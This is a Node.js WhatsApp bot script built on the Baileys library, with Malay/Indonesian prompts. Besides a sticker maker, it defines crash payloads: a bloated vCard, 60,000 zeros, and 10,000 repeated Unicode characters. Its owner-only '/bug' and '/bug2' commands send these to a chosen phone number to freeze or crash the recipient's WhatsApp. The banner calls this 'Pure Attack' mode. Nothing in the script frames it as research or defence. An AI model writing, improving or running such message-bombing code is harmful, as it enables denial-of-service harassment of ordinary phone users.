const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore, 
    generateWAMessageFromContent, 
    proto, 
    getContentType, 
    downloadContentFromMessage,
    prepareWAMessageMedia,
    Browsers, 
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const FormData = require('form-data')
const cheerio = require('cheerio')
const qrcode = require('qrcode-terminal')
const moment = require('moment-timezone')

// ==================== [ CONFIGURATION ] ====================

const owner = ["601121811615"] // Nomor kamu
const prefix = "/"
if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')
let db_user = JSON.parse(fs.readFileSync('./database.json', 'utf8'))

// ==================== [ INTERNAL TOOLS ] ====================

const time = moment.tz('Asia/Kuala_Lumpur').format('HH:mm:ss')
const date = moment.tz('Asia/Kuala_Lumpur').format('DD/MM/YYYY')

async function imageToWebp(media) {
    const tmpFileOut = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.webp`)
    const tmpFileIn = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.jpg`)
    fs.writeFileSync(tmpFileIn, media)
    await new Promise((resolve, reject) => {
        ff(tmpFileIn).on("error", reject).on("end", () => resolve(true))
        .addOutputOptions(["-vcodec","libwebp","-vf","scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
        .toFormat("webp").save(tmpFileOut)
    })
    const buff = fs.readFileSync(tmpFileOut)
    fs.unlinkSync(tmpFileOut); fs.unlinkSync(tmpFileIn)
    return buff
}

const payloads = {
    vcard: (target) => {
        return `BEGIN:VCARD\nVERSION:3.0\nFN:☠️ MARIAN-REBORN ☠️\nTEL;type=CELL;type=VOICE;waid=${target}:+${target}\n` + "X-ABLabel:Ponsel\n".repeat(200) + "END:VCARD"
    },
    ios: "0".repeat(60000),
    crash: "𑫀".repeat(10000)
}

// ==================== [ START ENGINE ] ====================

async function startMarianReborn() {
    console.log(chalk.red.bold(`
    ╔══════════════════════════════════════════════════╗
    ║  ⚡ MARIAN GIGA-AIO v7.0 [REBORN] ONLINE ⚡      ║
    ║  Mode: Pure Attack & Media | AI: Disabled        ║
    ║  Developer: Kean | Status: 100% Work             ║
    ╚══════════════════════════════════════════════════╝
    `))

    const { state, saveCreds } = await useMultiFileAuthState("sessions_marian_pro")
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        printQRInTerminal: true,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
    })

    if (!sock.authState.creds.registered) {
        const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
        readline.question(chalk.yellow("\n[!] Masukkan Nomor: "), async (nr) => {
            let code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
            console.log(chalk.black.bgWhite(`\n KODE PAIRING: ${code} \n`))
            readline.close()
        })
    }

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            if (reason !== DisconnectReason.loggedOut) startMarianReborn()
        } else if (connection === "open") {
            console.log(chalk.green.bold("\n[✓] MARIAN REBORN CONNECTED!"))
        }
    })

    sock.ev.on('call', async (node) => {
        const { from, id, status } = node[0]
        if (status === 'offer') await sock.rejectCall(id, from)
    })

    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            const from = m.key.remoteJid
            if (from.endsWith('@g.us')) return // Anti-Group

            const type = getContentType(m.message)
            const body = (type === 'conversation') ? m.message.conversation : 
                        (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                        (type === 'imageMessage') ? m.message.imageMessage.caption : ''
            
            if (!body.startsWith(prefix)) return

            const args = body.slice(prefix.length).trim().split(/ +/)
            const command = args.shift().toLowerCase()
            const text = args.join(" ")
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
            const isOwner = owner.includes(m.key.remoteJid.split('@')[0])

            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.white(` CMD: ${command}`))

            switch (command) {
                case 'menu':
                case 'help':
                    const menu = `*⚡ MARIAN GIGA-AIO [REBORN] ⚡*

*⚔️ ATTACK COMMANDS:*
• /bug [nomor] - VCard Storm
• /bug2 [nomor] - List UI Destroyer
• /bug-ios [nomor] - Special Apple Freeze
• /bug-crash [nomor] - Extreme Payload

*🎨 MEDIA TOOLS:*
• /s - Sticker maker (Reply foto)
• /tiktok [url] - Download TikTok
• /toimg - Sticker jadi foto

*🛠️ SYSTEM:*
• /ping - Cek speed
• /status - Info server
• /restart - Reboot engine

_Status: AI Disabled | Speed Optimized_`
                    await sock.sendMessage(from, { text: menu }, { quoted: m })
                    break;

                case 'ping':
                    await sock.sendMessage(from, { text: `🚀 Speed: ${Date.now() - m.messageTimestamp * 1000}ms` })
                    break;

                case 'bug':
                    if (!isOwner) return
                    let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    await sock.sendMessage(from, { text: "💀 Mengirim Bug..." })
                    for (let i = 0; i < 25; i++) {
                        await sock.sendMessage(target, { 
                            contacts: { displayName: "DIE", contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] }
                        })
                    }
                    break;

                case 'bug2':
                    if (!isOwner) return
                    let target2 = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    const bug2 = generateWAMessageFromContent(target2, {
                        listMessage: {
                            title: "CRASH " + payloads.crash,
                            buttonText: "DESTROY",
                            description: payloads.crash,
                            sections: [{ title: "ERR", rows: [{ title: "DIE", rowId: "1" }] }]
                        }
                    }, { userJid: target2 })
                    await sock.relayMessage(target2, bug2.message, { messageId: bug2.key.id })
                    break;

                case 's':
                    const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
                    if (!isImg) return
                    const stream = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
                    let buff = Buffer.from([])
                    for await (const chunk of stream) buff = Buffer.concat([buff, chunk])
                    const webp = await imageToWebp(buff)
                    await sock.sendMessage(from, { sticker: webp }, { quoted: m })
                    break;

                case 'restart':
                    if (!isOwner) return
                    process.exit()
                    break;
            }
        } catch (e) { console.log(e) }
    })
}

startMarianReborn().catch(err => console.log(err))
